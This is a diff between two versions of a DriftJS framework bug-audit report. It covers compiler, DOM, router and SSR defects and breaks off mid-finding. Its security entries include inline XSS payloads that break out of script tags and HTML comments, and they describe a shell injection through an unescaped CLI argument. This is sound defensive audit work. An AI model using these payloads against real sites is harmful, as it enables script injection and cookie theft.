@@ -1,367 +1,302 @@
-# DriftJS Codebase Bug Audit Report
+# DriftJS Codebase Bug Audit & Defect Report
 
-Comprehensive evaluation of defects, correctness failures, security vulnerabilities, and efficiency bottlenecks identified across the DriftJS monorepo codebase.
+This document provides a comprehensive, rigorous defect audit of the **DriftJS** codebase across all monorepo packages (`compiler`, `dom`, `ssr`, `router`, `utils`, `vite-plugin`, `cli`, and `vscode-plugin`).
 
-**Evaluation Criteria:**
-1. **Correctness** — Functional bugs, logic defects, spec mismatches, and state desynchronizations.
-2. **Security** — Vulnerabilities, injection hazards, XSS vectors, and prototype pollution risks.
-3. **Efficiency** — Performance bottlenecks, redundant evaluations, memory leaks, and compilation bloat.
-
----
-
-## Executive Summary Matrix
-
-| Defect ID | Category | Severity | Package / Module | Description Summary |
-| :---: | :--- | :---: | :--- | :--- |
-| **`BUG-01`** | **Correctness** | **High** | `driftjs-compiler` (`lexer.ts`) | Lexer prematurely closes `@if`/`@for`/`@switch` blocks on literal `}` in template text |
-| **`BUG-02`** | **Correctness** | **High** | `driftjs-dom` (`index.ts`) | Empty `DocumentFragment` keys in WeakMap prevent child VM unmounting and leak teardown callbacks |
-| **`BUG-03`** | **Correctness** | **High** | `driftjs-dom` (`index.ts`) | Keyed list in-place item fast-path ignores index updates for text interpolations |
-| **`BUG-04`** | **Correctness** | **Medium** | `driftjs-dom` (`index.ts`) | Static global event delegation map fails across multiple documents / iframes |
-| **`BUG-05`** | **Correctness** | **Medium** | `driftjs-dom` (`index.ts`) | Event handler `this` bound to internal handler dictionary instead of target DOM element |
-| **`BUG-06`** | **Correctness** | **Medium** | `driftjs-router` (`RouterLink.drift`) | `RouterLink` false positive active class matching on substring path prefixes |
-| **`BUG-07`** | **Correctness** | **Medium** | `driftjs-router` (`matcher.ts`) | Named route parameter replacement corrupts regexes, modifiers, and prefix names |
-| **`BUG-08`** | **Correctness** | **Medium** | `driftjs-compiler` (`lexer.ts`) | Escaped `\${` in template literal strings misparsed as interpolation delimiters |
-| **`BUG-09`** | **Correctness** | **Low** | `driftjs-shared` (`context.ts`) | `onUnmount` silently ignored when invoked within asynchronous callbacks |
-| **`BUG-10`** | **Security** | **High** | `driftjs-ssr` (`index.ts`) | Cross-Site Scripting (XSS) via script/style tag breakout during SSR HTML serialization |
-| **`BUG-11`** | **Security** | **High** | `create-drift` (`cli/src/index.ts`) | Shell Command Injection via unescaped package manager argument in `installDependencies` |
-| **`BUG-12`** | **Security** | **Medium** | `driftjs-shared` (`scope.ts`) | Prototype Pollution vulnerability in `setScopeValue` via unvalidated key assignment |
-| **`BUG-13`** | **Security** | **Medium** | `driftjs-ssr` (`index.ts`) | Unsanitized dynamic HTML tag names in server-side HTML serialization |
-| **`BUG-14`** | **Efficiency** | **High** | `driftjs-compiler` (`generator.ts`) | Excessive code expansion (~220B/id) and redundant prototype chain walks per identifier |
-| **`BUG-15`** | **Efficiency** | **Medium** | `driftjs-compiler` (`generator.ts`) | Duplicate sub-expression evaluation in `for...of` loops and destructuring assignments |
-| **`BUG-16`** | **Efficiency** | **Medium** | `driftjs-router` (`matcher.ts`) | Repeated regex re-compilation and $O(N \log N)$ path re-scoring during route indexing |
-| **`BUG-17`** | **Efficiency** | **Low** | `driftjs-dom` (`index.ts`) | Uncached event handler wrapper allocations on every VM execution pass |
+All identified defects are evaluated across three core criteria:
+1. **Correctness:** Logic errors, broken reactivity, event propagation anomalies, lifecycle failures, and routing bugs.
+2. **Security:** Cross-Site Scripting (XSS), prototype pollution, global scope exposure, and unsafe string parsing.
+3. **Efficiency:** Algorithmic bottlenecks, redundant traversals, and uncollected memory/event handlers.
 
 ---
 
-## 1. Correctness Defects
+## 📊 Defect Summary Matrix
 
-### `BUG-01`: Lexer Abruptly Closes `@if`/`@for`/`@switch` Blocks on Literal `}` Characters in Data State
-- **File**: [`packages/compiler/src/lexer.ts:L188-L192`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/lexer.ts#L188-L192)
-- **Severity**: **High**
-- **Root Cause**:
-  In `DriftLexer.readDataToken()`, when scanning element body text:
-  ```typescript
-  if (this.peek() === '}' && this.blockDepth > 0) {
-    this.advance();
-    this.blockDepth--;
-    return this.createToken(TokenType.BlockClose, '}', startLoc);
-  }
-  ```
-  When the lexer is inside an active directive (e.g. `@if (cond) { ... }`), `this.blockDepth > 0`. If the template contains a literal `}` inside text content (for instance, `<p>JSON syntax: { count: 1 }</p>` or `<span>}</span>`), the lexer immediately consumes `}` as `TokenType.BlockClose` and decrements `blockDepth`. The parser then treats the directive block as closed prematurely, causing subsequent closing HTML tags (e.g. `</p>` or `</span>`) to trigger fatal parse errors (`Unexpected closing tag '</...>' without opening tag`).
-- **Reproduction**:
-  ```html
-  @if (show) {
-    <div>JSON Format: { key: 10 }</div>
-  }
-  ```
-- **Remediation**:
-  The lexer should only emit `TokenType.BlockClose` when `}` is encountered at the top level of a directive block outside element tags, or the parser should track element nesting depth so that character `}` inside element text is scanned as `TokenType.Text`.
+| ID | Category | Package / Subsystem | File & Location | Severity | Summary |
+| :---: | :--- | :--- | :--- | :---: | :--- |
+| **BUG-01** | Correctness | `driftjs-compiler` | [`packages/compiler/src/generator.ts:491`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L491-L493) | **High** | Computed `MemberExpression` dynamic index identifiers omitted from reactive bindings & deps. |
+| **BUG-02** | Correctness | `driftjs-dom` | [`packages/dom/src/index.ts:255`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L248-L260) | **High** | Delegated event listener loop stops on first match (`break`), breaking standard DOM event bubbling. |
+| **BUG-03** | Correctness | `driftjs-dom` | [`packages/dom/src/index.ts:726`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L726-L741) | **High** | Fast-path element reuse in list reconciler discards updated event handler mappings on root elements. |
+| **BUG-04** | Correctness | `driftjs-router` | [`packages/router/src/components/RouterLink.drift:1`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/components/RouterLink.drift#L1-L49) | **Medium** | `RouterLink` missing router navigation subscription, causing active link CSS classes to stay frozen. |
+| **BUG-05** | Correctness | `driftjs-router` | [`packages/router/src/history.ts:262`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/history.ts#L260-L265) | **Medium** | `createMemoryHistory` fails to strip base path on `initialLocation`. |
+| **BUG-06** | Correctness | `driftjs-router` | [`packages/router/src/matcher.ts:338`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/matcher.ts#L338) | **Medium** | Custom regex route parameters with nested parentheses corrupt resolved URL paths. |
+| **BUG-07** | Correctness | `driftjs-compiler` | [`packages/compiler/src/generator.ts:1164`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L1164) | **Medium** | Object pattern destructuring defaults check `in` operator instead of `undefined`, overriding defaults. |
+| **BUG-08** | Correctness | `driftjs-compiler` | [`packages/compiler/src/generator.ts:1154`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L1154-L1164) | **Medium** | Destructuring computed property names in variable declarations treats code string as a literal key. |
+| **BUG-09** | Correctness | `driftjs-compiler` | [`packages/compiler/src/transformer.ts:189`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/transformer.ts#L189-L215) | **High** | `@switch` transformation with dynamic discriminants leaves alternate branches with untracked deps. |
+| **BUG-10** | Correctness | `driftjs-ssr` | [`packages/ssr/src/index.ts:261`](file:///home/hrutav-modha/Documents/driftjs/packages/ssr/src/index.ts#L261) | **Medium** | Server VM executes sub-modules with shared scope object instead of prototypal scope isolation. |
+| **BUG-11** | Security | `driftjs-ssr` | [`packages/ssr/src/index.ts:337`](file:///home/hrutav-modha/Documents/driftjs/packages/ssr/src/index.ts#L337) | **Critical** | Unescaped `-->` in HTML comment serialization permits arbitrary script injection & SSR XSS. |
+| **BUG-12** | Security | `driftjs-shared` | [`packages/utils/src/scope.ts:79`](file:///home/hrutav-modha/Documents/driftjs/packages/utils/src/scope.ts#L79-L82) | **Medium** | `getScopeValue` walks `Object.prototype` via `name in globalThis`, leaking standard prototypes. |
+| **BUG-13** | Security | `driftjs-compiler` | [`packages/compiler/src/generator.ts:790`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L790-L802) | **Low** | ArrayPattern destructuring assignment indexes directly without iterable resolution. |
+| **BUG-14** | Efficiency | `driftjs-dom` | [`packages/dom/src/index.ts:1074`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L1073-L1077) | **Medium** | $O(N)$ linear array search in `triggerUpdates` candidate region verification. |
+| **BUG-15** | Efficiency | `driftjs-dom` | [`packages/dom/src/index.ts:194`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L194-L200) | **Low** | `markDirty` lacks unmount check, allowing unmounted VMs to schedule redundant microtasks. |
 
 ---
 
-### `BUG-02`: DocumentFragment WeakMap Key Invalidation Prevents Child VM Unmounting & Leaks Teardown Callbacks
-- **File**: [`packages/dom/src/index.ts:L333-L354`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L333-L354), [`packages/dom/src/index.ts:L94-L111`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L94-L111)
-- **Severity**: **High**
-- **Root Cause**:
-  In `DriftClientVM.executeLoop` under opcode `MOUNT_COMPONENT`:
+## 🔍 Detailed Defect Analysis
+
+### 1. Correctness
+
+#### `BUG-01`: Computed `MemberExpression` Identifier Extraction Omission in Generator
+- **Package:** `driftjs-compiler`
+- **File:** [`packages/compiler/src/generator.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L491-L493)
+- **Severity:** High
+- **Description:**
+  In `DriftGenerator.extractIdentifiers(node)`, handling for `MemberExpression` only traverses `node.object`:
   ```typescript
-  const compNode = childVM.execute(compMod, { scope: propsScope, document: doc });
-  if (compNode) {
-    this.childVMs.set(compNode, { vm: childVM, scope: childVM.scope, propsSpec });
-    this.mountedChildVMs.add(childVM);
-    this.setRegister(dstReg, compNode);
-  }
-  ```
-  When a child SFC contains multiple root nodes or `<script>` tags, `childVM.execute()` returns a `DocumentFragment` (`nodeType === 11`). `this.childVMs.set(compNode, ...)` associates the child VM with the `DocumentFragment` reference.
-  However, when opcode `APPEND_CHILD` attaches `compNode` to a parent DOM element, the browser DOM engine moves all children from the fragment into the parent element, emptying the fragment.
-  When the parent element is later unmounted via `unmountSubtree(node)`:
-  ```typescript
-  public unmountSubtree(node: Node | null): void {
-    if (!node) return;
-    const entry = this.childVMs.get(node);
-    if (entry) {
-      this.mountedChildVMs.delete(entry.vm);
-      entry.vm.unmount();
-      this.childVMs.delete(node);
-    }
-    const children = (node as any).childNodes;
-    if (children) {
-      for (let i = 0; i < children.length; i++) {
-        this.unmountSubtree(children[i]);
-      }
-    }
-  }
-  ```
-  The DOM traversal encounters the individual child nodes, none of which match the empty `DocumentFragment` key in `this.childVMs`. Consequently, `entry.vm.unmount()` is never called, `mountedChildVMs` retains the child VM, and the child's `onUnmount` callbacks and interval/event listeners are permanently leaked.
-- **Remediation**:
-  Store child nodes inside an array on the component entry or map all root child nodes of the fragment to the child VM in `this.childVMs`.
-
----
-
-### `BUG-03`: Stale / Incorrect Index Text in Keyed List In-Place Item Fast-Path
-- **File**: [`packages/dom/src/index.ts:L673-L679`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L673-L679)
-- **Severity**: **High**
-- **Root Cause**:
-  In `REACTIVE_FOR` reconciliation:
-  ```typescript
-  if (itemsEqual(record.itemVal, itemVal)) {
-    record.indexVal = indexVal;
-    if (record.nodes.length > 0) {
-      vm.patchItemAttributes(bodyMod, childScope, record.nodes[0]);
-    }
-    return;
-  }
-  ```
-  When array elements are reordered, inserted at the beginning, or deleted, an item's data object identity may remain identical (`itemsEqual` is `true`), but its `indexVal` position changes.
-  The fast-path branch updates `record.indexVal` and calls `patchItemAttributes()`, which exclusively updates dynamic HTML attributes on `record.nodes[0]`. It does **not** update dynamic text interpolations (`INTERPOLATE_TEXT`) inside the item that reference the loop index variable (`index` / `i`).
-- **Impact**:
-  Templates rendering row numbers or index-derived values (e.g. `<li>#{index + 1}: {item.name}</li>`) display stale, incorrect indices after list reordering or insertion.
-- **Remediation**:
-  Check if `record.indexVal !== indexVal` and trigger text interpolation updates for the row, or fall back to full row re-evaluation if the loop template references the index variable.
-
----
-
-### `BUG-04`: Multi-Document & Iframe Event Delegation Failure via Static Global Listener Map
-- **File**: [`packages/dom/src/index.ts:L69`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L69), [`packages/dom/src/index.ts:L233-L258`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L233-L258)
-- **Severity**: **Medium**
-- **Root Cause**:
-  `DriftClientVM.globalDelegatedListeners` is defined as a static `Map<string, (e: Event) => void>`.
-  In `ensureEventDelegated(eventName)`:
-  ```typescript
-  if (!DriftClientVM.globalDelegatedListeners.has(eventName)) {
-    const listener = (e: Event) => { ... };
-    root.addEventListener(eventName, listener, useCapture);
-    DriftClientVM.globalDelegatedListeners.set(eventName, listener);
-  }
-  ```
-  If a second VM instance is initialized in a different Document context (such as in JSDOM unit test runners, multi-window apps, iframe sandboxes, or micro-frontends), `globalDelegatedListeners.has(eventName)` returns `true` from the first document. Thus, `addEventListener` is never called on the second document, causing all delegated event handlers in that document to silently fail.
-- **Remediation**:
-  Track delegated listeners per `Document` root (e.g., using a `WeakMap<Document, Set<string>>`).
-
----
-
-### `BUG-05`: Event Handler `this` Bound to Internal Handler Dictionary Instead of Target DOM Element
-- **File**: [`packages/dom/src/index.ts:L247`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L247), [`packages/dom/src/index.ts:L409-L419`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L409-L419)
-- **Severity**: **Medium**
-- **Root Cause**:
-  In `ensureEventDelegated`, the delegated event dispatcher invokes:
-  ```typescript
-  const handlers = DriftClientVM.eventHandlersMap.get(curr);
-  if (handlers && handlers[eventName]) {
-    handlers[eventName](e);
+  case 'MemberExpression':
+    for (const id of this.extractIdentifiers(node.object)) ids.add(id);
     break;
-  }
   ```
-  Because `handlers[eventName](e)` is invoked as a method of `handlers`, the `this` binding inside `wrappedHandler` becomes the plain JavaScript dictionary `{ click: fn }`.
-  Inside `wrappedHandler`:
+  When an expression uses computed indexing (e.g. `items[selectedKey]` or `matrix[row][col]`), `node.property` contains an identifier (`selectedKey`, `row`, `col`). Because `node.property` is ignored when `node.computed === true`, `selectedKey` is never added to `ids`.
+- **Impact:**
+  The compiler fails to emit `ReactiveBinding` entries or include the variable in sub-module `deps`. Mutating `selectedKey` does not trigger DOM updates for `{items[selectedKey]}` or `@if items[selectedKey]`.
+- **Suggested Fix:**
   ```typescript
-  const result = val.apply(this, args);
-  ```
-  `val` is invoked with `this` set to the internal `handlers` object rather than the target DOM element `curr` (`e.currentTarget`).
-- **Remediation**:
-  Invoke `handlers[eventName].call(curr, e)` so `this` properly refers to the element that registered the event listener.
-
----
-
-### `BUG-06`: `RouterLink` False Positive Active Class Matching on Substring Path Prefixes
-- **File**: [`packages/router/src/components/RouterLink.drift:L22`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/components/RouterLink.drift#L22)
-- **Severity**: **Medium**
-- **Root Cause**:
-  In `RouterLink.drift`, `computeClass()` determines if a non-exact link is active using:
-  ```typescript
-  if (router.resolve(to).path !== '/' && router.currentRoute.path.startsWith(router.resolve(to).path)) {
-    return (customClass ? customClass + ' ' : '') + (props.activeClass || 'router-link-active');
-  }
-  ```
-  Calling `startsWith()` without ensuring segment boundaries (`/`) causes unrelated routes that share a string prefix to be marked active. For example, if a link points to `/user`, navigating to `/users`, `/username`, or `/user-profile` will trigger `'/users'.startsWith('/user') === true` and erroneously mark the link active.
-- **Remediation**:
-  Verify that the path is followed by `/` or end-of-string:
-  `const target = router.resolve(to).path; current.startsWith(target === '/' ? '/' : target + '/') || current === target`.
-
----
-
-### `BUG-07`: Router Parameter Interpolation Corrupts Paths with Regexes or Modifiers
-- **File**: [`packages/router/src/matcher.ts:L338-L343`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/matcher.ts#L338-L343)
-- **Severity**: **Medium**
-- **Root Cause**:
-  In `createMatcher().resolve()`, named route interpolation performs naive string replacement:
-  ```typescript
-  for (const key of Object.keys(params)) {
-    const val = params[key];
-    const strVal = Array.isArray(val) ? val.join('/') : String(val);
-    targetPath = targetPath.replace(`:${key}`, strVal);
-  }
-  ```
-  When routes declare parameters with custom regexes (e.g. `/user/:id(\\d+)`) or modifiers (`:id?`, `:path*`), replacing `:id` produces `/user/123(\\d+)` or `/user/123?`, resulting in unmatchable URLs. In addition, if one parameter name is a prefix of another (e.g., `:id` and `:id_name`), `:id` will replace the prefix of `:id_name`.
-- **Remediation**:
-  Use regex parameter pattern matching to replace the full segment token `/:([a-zA-Z0-9_]+)(?:\\(.*\\))?[?*+]?/` with the parameter value.
-
----
-
-### `BUG-08`: Escaped `\${` in Template Literal Strings Misparsed as Interpolation Delimiters
-- **File**: [`packages/compiler/src/lexer.ts:L675`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/lexer.ts#L675)
-- **Severity**: **Medium**
-- **Root Cause**:
-  In `DriftLexer.readInterpolationToken()`, when scanning template strings enclosed in backticks:
-  ```typescript
-  else if (inStringQuote === '`' && ch === '{' && expression.endsWith('${')) {
-    templateStack.push(braceDepth);
-    inStringQuote = null;
-    braceDepth++;
-  }
-  ```
-  If the source code contains an escaped template literal like `` `Price: \${amount}` ``, `expression.endsWith('${')` evaluates to `true` despite the preceding backslash `\`. The lexer incorrectly switches into expression mode inside an escaped string literal.
-- **Remediation**:
-  Verify that the character preceding `$` in `expression` is not an unescaped backslash `\`.
-
----
-
-### `BUG-09`: `onUnmount` Silently Ignored When Invoked Within Asynchronous Callbacks
-- **File**: [`packages/utils/src/context.ts:L102-L110`](file:///home/hrutav-modha/Documents/driftjs/packages/utils/src/context.ts#L102-L110)
-- **Severity**: **Low**
-- **Root Cause**:
-  `onUnmount(callback)` retrieves the active VM via `getActiveVM()`, which relies on the synchronous execution stack managed by `pushActiveVM` / `popActiveVM`.
-  If `onUnmount` is called inside an asynchronous microtask, timer, or promise callback (`setTimeout`, `fetch().then()`), `getActiveVM()` returns `null`, and the unmount callback is dropped silently without an error or warning.
-- **Remediation**:
-  Log a diagnostic warning or throw an error when `onUnmount` is called outside synchronous component initialization.
-
----
-
-## 2. Security Vulnerabilities
-
-### `BUG-10`: Cross-Site Scripting (XSS) via Script/Style Tag Breakout in SSR HTML Serialization
-- **File**: [`packages/ssr/src/index.ts:L322-L330`](file:///home/hrutav-modha/Documents/driftjs/packages/ssr/src/index.ts#L322-L330)
-- **Severity**: **High** (`CWE-79: Improper Neutralization of Input During Web Page Generation`)
-- **Root Cause**:
-  In `serializeNode(node, isRawText)`:
-  ```typescript
-  export function serializeNode(node: ServerNode | string, isRawText = false): string {
-    if (typeof node === 'string') return isRawText ? node : escapeHtml(node);
-    if (node.type === 'text') return isRawText ? (node.content ?? '') : escapeHtml(node.content ?? '');
-    ...
-    if (node.type === 'element') {
-      const tag = node.tag!;
-      const isRaw = tag.toLowerCase() === 'script' || tag.toLowerCase() === 'style';
-      ...
-      const childrenStr = node.children.map((c) => serializeNode(c, isRaw)).join('');
-      return `<${tag}${attrsStr}>${childrenStr}</${tag}>`;
+  case 'MemberExpression':
+    for (const id of this.extractIdentifiers(node.object)) ids.add(id);
+    if (node.computed && node.property) {
+      for (const id of this.extractIdentifiers(node.property)) ids.add(id);
     }
+    break;
   ```
-  When rendering `<script>` or `<style>` elements, `isRaw` is set to `true`, which disables HTML entity escaping for all child text nodes. If dynamic text or interpolated data within `<script>` or `<style>` contains closing tags such as `</script><script>alert(document.domain)</script>`, the server serializes the raw closing tag directly into the HTML document stream.
-- **Attack Vector**:
-  An attacker provides an input containing `</script><script>maliciousCode()</script>` rendered into an inline script block. When server-rendered, the browser breaks out of the original script element and executes the injected script payload.
-- **Remediation**:
-  Sanitize raw text blocks in SSR by escaping `</script` to `<\/script` and `</style` to `<\/style`.
 
 ---
 
-### `BUG-11`: Shell Command Injection via Unescaped Package Manager Argument in `installDependencies`
-- **File**: [`packages/cli/src/index.ts:L87-L93`](file:///home/hrutav-modha/Documents/driftjs/packages/cli/src/index.ts#L87-L93)
-- **Severity**: **High** (`CWE-78: Improper Neutralization of Special Elements used in an OS Command`)
-- **Root Cause**:
-  In `create-drift` CLI:
+#### `BUG-02`: Delegated Event Listener Stops Traversal on First Handler (`break`), Breaking DOM Bubbling
+- **Package:** `driftjs-dom`
+- **File:** [`packages/dom/src/index.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L248-L260)
+- **Severity:** High
+- **Description:**
+  `DriftClientVM.ensureEventDelegated()` registers a document-level listener that traverses up from `e.target`:
   ```typescript
-  export function installDependencies(targetDir: string, pm: string): void {
-    console.log(`\n📦 Installing dependencies with ${pm}...\n`);
-    execSync(`${pm} install`, {
-      cwd: targetDir,
-      stdio: 'inherit',
-    });
+  const listener = (e: Event) => {
+    let curr = e.target as Node | null;
+    while (curr && curr !== root) {
+      if (curr.nodeType === 1) {
+        const handlers = DriftClientVM.eventHandlersMap.get(curr);
+        if (handlers && handlers[eventName]) {
+          handlers[eventName].call(curr, e);
+          break; // <-- Terminates event dispatch immediately
+        }
+      }
+      curr = curr.parentNode;
+    }
+  };
+  ```
+- **Impact:**
+  Standard DOM event bubbling is completely broken for nested components/elements with event handlers. If a child element (`<button onclick={onBtnClick}>`) is clicked inside a container (`<div onclick={onContainerClick}>`), `onContainerClick` is never executed because `break;` aborts the ancestor traversal after `onBtnClick`.
+- **Suggested Fix:**
+  Traverse the ancestor chain and execute each matched handler unless `e.cancelBubble` or `e.defaultPrevented` / stopped flag is set.
+
+---
+
+#### `BUG-03`: Reconciler List Element Fast-Path Re-render Drops Updated Event Handlers
+- **Package:** `driftjs-dom`
+- **File:** [`packages/dom/src/index.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/dom/src/index.ts#L726-L741)
+- **Severity:** High
+- **Description:**
+  When a list row in `@for` is re-rendered (due to item data change or index change), lines 726–740 execute `vm.runSubModule(bodyMod, childScope)`, which produces a fresh `DocumentFragment` containing `newElem`. `SET_ATTR` attaches new event listeners to `newElem` in `DriftClientVM.eventHandlersMap`.
+  The reconciler then copies attributes and children from `newElem` onto the existing `elem` (`record.nodes[0]`) and discards `newElem`. However, `elem`'s entry in `DriftClientVM.eventHandlersMap` is not updated with `newElem`'s handlers.
+- **Impact:**
+  The reused root DOM element of the row retains the stale closure from its previous render. Event triggers invoke obsolete handlers or operate against old scope state.
+- **Suggested Fix:**
+  Copy/re-assign the handler mapping from `newElem` to `elem` in `DriftClientVM.eventHandlersMap` before discarding `newElem`.
+
+---
+
+#### `BUG-04`: `RouterLink` Single File Component Missing Router Change Subscription
+- **Package:** `driftjs-router`
+- **File:** [`packages/router/src/components/RouterLink.drift`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/components/RouterLink.drift#L1-L49)
+- **Severity:** Medium
+- **Description:**
+  `RouterLink.drift` evaluates `computeHref()` and `computeClass()` upon initialization, but unlike `RouterView.drift`, it does not subscribe to `router.subscribe()`.
+- **Impact:**
+  When navigation occurs (e.g. `router.push('/about')`), `RouterLink` instances on the page are never informed of route changes. The active CSS classes (`router-link-active`, `router-link-exact-active`) remain frozen in their initial state.
+- **Suggested Fix:**
+  Subscribe to `router.subscribe()` inside `<script>` and mark component state dirty or update active status on route transitions.
+
+---
+
+#### `BUG-05`: Memory History Driver Fails to Strip Base Path on `initialLocation`
+- **Package:** `driftjs-router`
+- **File:** [`packages/router/src/history.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/history.ts#L260-L265)
+- **Severity:** Medium
+- **Description:**
+  `createMemoryHistory(initialLocation = '/', base = '')` initializes its history stack using:
+  ```typescript
+  const entries: string[] = [initialLocation.startsWith('/') ? initialLocation : '/' + initialLocation];
+  ```
+  It does not apply `stripBase(initialLocation, normalizedBase)`.
+- **Impact:**
+  When initialized as `createMemoryHistory('/app/dashboard', '/app')`, `history.location` returns `'/app/dashboard'` instead of `'/dashboard'`, leading to route resolution mismatch in SSR and unit tests.
+- **Suggested Fix:**
+  Apply `stripBase(initialLocation, normalizedBase)` when initializing `entries`.
+
+---
+
+#### `BUG-06`: Custom Regex Route Param Substitution Corrupted by Nested Parentheses in `resolve()`
+- **Package:** `driftjs-router`
+- **File:** [`packages/router/src/matcher.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/router/src/matcher.ts#L338)
+- **Severity:** Medium
+- **Description:**
+  `RouteMatcher.resolve()` performs parameter substitution in named paths using:
+  ```typescript
+  targetPath = targetPath.replace(/:([a-zA-Z0-9_]+)(?:\([^)]*\))?[?*+]?/g, ...);
+  ```
+  The pattern `(?:\([^)]*\))` does not support nested parentheses in custom regex constraints (e.g. `:id((a|b)+)` or `:code([0-9]{2,4}(?:-[a-z]+)?)`).
+- **Impact:**
+  Matching stops at the first closing parenthesis `)` and leaves residual regex tokens (e.g. `)+`) in the resulting URL string.
+
+---
+
+#### `BUG-07`: Object Pattern Destructuring Defaults Check `in` Operator Instead of `undefined`
+- **Package:** `driftjs-compiler`
+- **File:** [`packages/compiler/src/generator.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L1164)
+- **Severity:** Medium
+- **Description:**
+  In `astToJS` for `VariableDeclaration` with `ObjectPattern`, property extraction emits:
+  ```typescript
+  const expr = `((_obj && (${JSON.stringify(propKey)} in _obj)) ? _obj[${JSON.stringify(propKey)}] : ${defaultValJS ?? 'undefined'})`;
+  ```
+- **Impact:**
+  In JavaScript destructuring (`const { a = 10 } = { a: undefined }`), default values apply whenever `_obj[key] === undefined`. Because Drift checks `propKey in _obj`, `{ a: undefined }` assigns `undefined` instead of `10`.
+- **Suggested Fix:**
+  Check `_obj[propKey] !== undefined` rather than `propKey in _obj`.
+
+---
+
+#### `BUG-08`: Destructuring Computed Properties in Variable Declarations Treats Code String as Literal Key
+- **Package:** `driftjs-compiler`
+- **File:** [`packages/compiler/src/generator.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/generator.ts#L1154-L1164)
+- **Severity:** Medium
+- **Description:**
+  When destructuring with computed keys (e.g. `const { [key]: value } = obj`), `propKey` is transpiled as an expression string (`_get(scope, "key")`), but then wrapped in `JSON.stringify(propKey)`:
+  ```typescript
+  _obj[${JSON.stringify(propKey)}]
+  ```
+- **Impact:**
+  Emits `_obj["(typeof _get === 'function' ? ...)"]` rather than evaluating `_obj[_get(scope, "key")]`.
+
+---
+
+#### `BUG-09`: `@switch` Transformation with Dynamic Discriminants Leaves Alternate Branches with Untracked Dependencies
+- **Package:** `driftjs-compiler`
+- **File:** [`packages/compiler/src/transformer.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/compiler/src/transformer.ts#L189-L215)
+- **Severity:** High
+- **Description:**
+  When transforming `@switch (expr)` with non-trivial expressions (e.g. `state.status`), `DriftTransformer` transforms Case 1 into `(__drift_sw_0 = state.status) === val1` and subsequent cases into `__drift_sw_0 === val2`.
+  Because `__drift_sw_0` is an internal synthetic variable not present in `declaredVars`, `DriftGenerator` extracts zero dependencies for subsequent `@case` sub-modules.
+- **Impact:**
+  Alternate `@case` branches fail to re-render when `state.status` changes because their sub-modules have empty dependency sets (`deps: []`).
+
+---
+
+#### `BUG-10`: Headless Server VM Executes Sub-modules Without Prototypal Scope Isolation
+- **Package:** `driftjs-ssr`
+- **File:** [`packages/ssr/src/index.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/ssr/src/index.ts#L261)
+- **Severity:** Medium
+- **Description:**
+  In `DriftServerVM.execute()`, `REACTIVE_IF` executes sub-modules passing `{ scope: this.scope }`. The sub-VM directly assigns `this.scope = options.scope` rather than wrapping it in `Object.create(this.scope)`.
+- **Impact:**
+  Sub-module scope mutations leak into the parent scope during SSR, causing scope pollution across rendered fragments.
+
+---
+
+### 2. Security
+
+#### `BUG-11`: HTML Comment Injection & Cross-Site Scripting (XSS) in Server-Side Rendering
+- **Package:** `driftjs-ssr`
+- **File:** [`packages/ssr/src/index.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/ssr/src/index.ts#L337)
+- **Severity:** Critical
+- **Description:**
+  In `serializeNode()`, comment nodes are serialized directly without escaping or checking for comment closing sequences:
+  ```typescript
+  if (node.type === 'comment') return `<!--${node.content ?? ''}-->`;
+  ```
+- **Impact:**
+  If user-controlled content is rendered in a comment (e.g. `<!-- ${userInput} -->`), input containing `--> <script>alert(document.cookie)</script> <!--` terminates the HTML comment boundary and executes arbitrary scripts in the client browser during SSR.
+- **Suggested Fix:**
+  Sanitize or escape `-->` sequences (e.g., replacing `-->` with `-- >` or `&#45;&#45;&gt;`) in `serializeNode()`.
+
+---
+
+#### `BUG-12`: Prototype Chain & Global Scope Exposure in Scope Evaluator (`_get` / `getScopeValue`)
+- **Package:** `driftjs-shared`
+- **File:** [`packages/utils/src/scope.ts`](file:///home/hrutav-modha/Documents/driftjs/packages/utils/src/scope.ts#L79-L82)
+- **Severity:** Medium
+- **Description:**
+  In `getScopeValue(scope, name)`:
+  ```typescript
+  if (typeof globalThis !== 'undefined' && globalThis && name in globalThis) {
+    return (globalThis as any)[name];
   }
   ```
